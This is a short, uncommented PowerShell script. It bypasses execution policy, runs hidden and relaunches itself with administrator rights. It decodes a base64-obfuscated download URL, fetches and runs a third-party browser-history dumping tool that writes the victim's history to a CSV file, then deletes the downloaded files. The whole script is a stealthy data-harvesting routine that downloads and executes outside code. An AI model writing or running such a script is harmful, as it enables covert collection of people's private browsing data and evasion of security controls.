$ep = '-ExecutionPolicy Bypass -noprofile -windowstyle hidden -file'
$u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly93d3cubmlyc29mdC5uZXQvdXRpbHMvYnJvd3NpbmdoaXN0b3J5dmlldy56aXA='))
$f = 'bhv.zip'; $e = '.\u'; $o = 'out.csv'

Start-Process -FilePath 'powershell.exe' -ArgumentList "$ep `"$PSCommandPath`"" -Verb runAs
if ($MyInvocation.Line -notmatch 'ExecutionPolicy') { exit }

Invoke-WebRequest -Uri $u -OutFile $f
Expand-Archive -Path $f -DestinationPath $e -Force

$p = Join-Path $e 'BrowsingHistoryView.exe'
Start-Process -FilePath $p -ArgumentList "/scomma $o" -Wait

Remove-Item $f -Force
Remove-Item $e -Recurse -Force
